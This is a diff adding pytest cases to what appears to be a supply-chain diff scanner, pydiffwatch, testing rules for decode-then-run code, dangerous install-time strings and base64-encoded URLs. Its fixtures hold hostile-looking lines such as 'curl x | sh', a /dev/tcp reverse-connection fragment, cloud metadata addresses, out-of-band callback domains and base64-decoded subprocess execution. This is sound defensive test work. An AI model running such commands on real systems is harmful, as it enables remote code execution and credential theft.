@@ -18,14 +18,15 @@ def test_all_shipped_rules_valid_and_no_crownjewel():
     expected = {"syntax-error-suspicious", "primitives", "autoexec-location", "combo-fetch-exec",
                 "combo-decode-exec", "combo-cred-network", "binary-source-too-large",
                 "foreign-language-source", "binary-new-binary", "dep-typosquat", "dep-nonexistent",
-                "dep-brand-new", "maintainer-set-change"}
+                "dep-brand-new", "maintainer-set-change", "combo-decode-run", "syntax-newer-than-runtime",
+                "py-install-code-dangerous", "encoded-url-literal"}
     assert expected <= ids, f"missing: {expected - ids}"
     assert "obfuscated-loader" not in ids   # crown jewel (decode->exec taint) is NOT shipped
 
 
 def test_no_rule_was_dropped_as_invalid():
     # every shipped YAML rule must pass validation (load_rules silently drops invalid ones)
-    assert len(RULES) == 13
+    assert len(RULES) == 17
 
 
 def test_install_hook_escalates():
@@ -198,3 +199,115 @@ def test_file_too_large_scores_nothing_but_is_a_valid_binary_reason():
     r = triage(d, Config(), RULES)
     assert r.score == 0 and not r.fired_rules
     assert "file-too-large" in rules_mod.BINARY_REASONS
+
+
+# ---- PR D ----
+import pytest
+from pydiffwatch import facts as facts_mod
+
+
+def _fires(diff, rule):
+    return [f for f in triage(diff, Config(), RULES).fired_rules if f.rule == rule]
+
+
+def _files(*pairs, rp=None):
+    return Diff("p", "1.1", False, [FileDiff(p, "modified", [Hunk((0, 0), (0, len(a)), a, [])], "\n".join(a))
+                                    for p, a in pairs], [], requires_python=rp)
+
+
+@pytest.mark.parametrize("path,added", [
+    ("pkg/m.py", ["import subprocess, base64", "subprocess.run(base64.b64decode(c), shell=True)"]),
+    ("pkg/m.py", ["import os, zlib", "os.system(zlib.decompress(b))"]),
+    ("pkg/m.py", ["import subprocess, codecs", 'subprocess.Popen(codecs.decode(s, "rot13"))']),
+    ("conftest.py", ["import subprocess, base64", "subprocess.run(base64.b64decode(c), shell=True)"]),
+])
+def test_combo_decode_run_fires_and_escalates(path, added):
+    assert _fires(_code(path, added), "combo-decode-run")
+    assert triage(_code(path, added), Config(), RULES).escalate
+
+
+@pytest.mark.parametrize("path,added", [
+    ("pkg/m.py", ["import base64", "base64.b64decode(c)"]),
+    ("pkg/m.py", ["import subprocess", "subprocess.run(c)"]),
+    ("pkg/m.py", ["import pickle, subprocess", "subprocess.run(pickle.loads(b))"]),
+    ("tests/test_m.py", ["import subprocess, base64", "subprocess.run(base64.b64decode(c), shell=True)"]),
+])
+def test_combo_decode_run_does_not_fire(path, added):
+    assert not _fires(_code(path, added), "combo-decode-run")
+
+
+def test_decode_process_and_exec_score_the_combo_once():
+    d = _code("pkg/m.py", ["import subprocess, base64", "exec(base64.b64decode(c))", "subprocess.run(c)"])
+    fired = triage(d, Config(), RULES).fired_rules
+    assert [f.rule for f in fired if f.rule.startswith("combo-decode")] == ["combo-decode-exec"]
+    assert sum(f.weight for f in fired if f.rule.startswith("combo-")) == 45
+
+
+_INSTALL_STRINGS = ["curl x | sh", "curl x |bash", "exec 3<>/dev/tcp/1.2.3.4/80", "echo x | base64 -d",
+                    "base64 --decode", "169.254.169.254", "100.100.100.200", "169.254.0.23",
+                    "metadata.google.internal", "metadata.tencentyun.com", "nslookup x.example",
+                    "a.oast.fun", "x.oastify.com", "burpcollaborator.net", "interact.sh", "dnslog.cn"]
+
+
+@pytest.mark.parametrize("s", _INSTALL_STRINGS)
+def test_py_install_code_dangerous_fires_in_setup_py(s):
+    d = _code("setup.py", [f"CMD = {s!r}"])
+    assert _fires(d, "py-install-code-dangerous") and triage(d, Config(), RULES).escalate
+
+
+@pytest.mark.parametrize("path,line", [("setup.cfg", "cmd = curl x | sh"),
+                                       ("hatch_build.py", "CMD = 'curl x | sh'"),
+                                       ("x.pth", "import os; os.system('curl x | sh')")])
+def test_py_install_code_dangerous_fires_in_other_build_files(path, line):
+    assert _fires(_code(path, [line]), "py-install-code-dangerous")
+
+
+@pytest.mark.parametrize("path,line", [("pkg/util.py", "CMD = 'curl x | sh'"),
+                                       ("pyproject.toml", '[tool.poe.tasks] lint = "curl x | sh"'),
+                                       ("setup.py", "CMD = 'a || shx'"), ("setup.py", "CMD = 'x | shasum'"),
+                                       ("setup.py", "CMD = 'sha256sum x'")])
+def test_py_install_code_dangerous_does_not_fire(path, line):
+    assert not _fires(_code(path, [line]), "py-install-code-dangerous")
+
+
+_URL_LINE = 'url_unformatted = "aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvZGF0YS5qc29u"'
+
+
+def test_encoded_url_literal_escalates_in_code():
+    assert [f.weight for f in _fires(_code("pkg/_connect.py", [_URL_LINE]), "encoded-url-literal")] == [45.0]
+    assert triage(_code("pkg/_connect.py", [_URL_LINE]), Config(), RULES).escalate
+
+
+def test_encoded_url_literal_is_gated_not_scaled():
+    assert [f.weight for f in _fires(_code("setup.py", [_URL_LINE]), "encoded-url-literal")] == [45.0]
+    assert not _fires(_code("tests/test_oauth.py", [_URL_LINE]), "encoded-url-literal")
+    assert not triage(_code("tests/test_oauth.py", [_URL_LINE]), Config(), RULES).escalate
+
+
+_BAD = ["def f(:", "    pass"]      # Ruling P1
+
+
+def test_syntax_error_suspicious_skips_cython_and_skew(monkeypatch):
+    monkeypatch.setattr(facts_mod, "RUNTIME", (3, 13))
+    assert not _fires(_code("pkg/m.pyx", ["cdef int x = 1"]), "syntax-error-suspicious")
+    assert not _fires(_files(("pkg/m.py", _BAD), rp=">=3.14"), "syntax-error-suspicious")
+    assert [f.weight for f in _fires(_files(("pkg/__init__.py", _BAD), rp=">=3.14"), "syntax-error-suspicious")] == [60.0]
+
+
+def test_syntax_newer_than_runtime(monkeypatch):
+    monkeypatch.setattr(facts_mod, "RUNTIME", (3, 13))
+    one = _files(("pkg/m.py", _BAD), rp=">=3.14")
+    assert [f.weight for f in _fires(one, "syntax-newer-than-runtime")] == [10.0]
+    assert not triage(one, Config(), RULES).escalate
+    prims = [(f"pkg/p{i}.py", ["import os", "os.system(c)"]) for i in range(7)]      # primitives at its 35 cap
+    with_prims = triage(_files(("pkg/m.py", _BAD), *prims, rp=">=3.14"), Config(), RULES)
+    assert with_prims.escalate and with_prims.score == 45
+    four = triage(_files(*[(f"pkg/m{i}.py", _BAD) for i in range(4)], rp=">=3.14"), Config(), RULES)
+    assert four.escalate and four.score == 40
+    assert [f.weight for f in _fires(_files(("tests/test_m.py", _BAD), rp=">=3.14"), "syntax-newer-than-runtime")] == [2.0]
+    assert not _fires(_files(("pkg/__init__.py", _BAD), rp=">=3.14"), "syntax-newer-than-runtime")
+
+
+def test_a_root_conftest_is_not_an_autoexec_location():
+    d = _code("conftest.py", ["import os", "os.system(c)"])
+    assert not _fires(d, "autoexec-location") and triage(d, Config(), RULES).score == 5
